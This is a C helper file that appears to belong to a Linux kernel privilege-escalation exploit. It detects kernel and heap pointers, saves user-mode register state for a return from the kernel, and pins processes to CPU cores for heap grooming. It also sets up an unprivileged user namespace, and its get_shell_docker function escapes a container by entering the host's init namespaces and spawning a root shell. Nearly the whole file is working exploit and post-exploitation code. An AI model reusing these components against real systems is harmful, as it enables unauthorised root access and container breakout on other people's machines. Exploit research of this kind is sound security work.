#define _GNU_SOURCE
#include <fcntl.h>
#include <stdarg.h>
#include <sys/resource.h>
#include <unistd.h>
#include "util.h"

bool is_kernel_ptr(uint64_t val)
{
    return (val & KERNEL_MASK) == KERNEL_MASK
        && val != 0xffffffffffffffff;
}

bool is_heap_ptr(uint64_t val)
{
    return (val & HEAP_MASK) == HEAP_MASK
        && (val & KERNEL_MASK) != KERNEL_MASK
        && val != 0xffffffffffffffff;
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

void hexdump(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void get_shell_docker(void){
	puts("Got r00t :)");
    // spin the parent
    //if(fork()){ for(;;); }
    // move to safe cpu
    // to prevent access to corrupted freelist
    assign_to_core(1);
    sleep(1);

	// escape pid/mount/network namespace
	setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
	setns(open("/proc/1/ns/pid", O_RDONLY), 0);
	setns(open("/proc/1/ns/net", O_RDONLY), 0);

	// drop root shell
	execlp("/bin/bash", "/bin/bash", NULL);
	exit(0);
}

static void get_shell(void)
{
    if (!getuid())
	{
		puts("Got r00t :)");
	    execlp("/bin/bash", "/bin/bash", NULL);
	}
	exit(0);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
void save_state(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void assign_thread_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] assign_thread_to_core_range()");
    }
}

void assign_to_core(int core_id)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);

    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        errExit("[X] sched_setaffinity()");
    }
}

int ulimit_fd(void) {
    struct rlimit rlim;

    // Get the current resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    //printf("Current maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    // Increase the maximum file descriptors limit
    rlim.rlim_cur = rlim.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("setrlimit");
        return 1;
    }

    // Get the updated resource limits
    if (getrlimit(RLIMIT_NOFILE, &rlim) == -1) {
        perror("getrlimit");
        return 1;
    }

    printf("New maximum file descriptors limit: %ld\n", rlim.rlim_cur);

    return 0;
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}
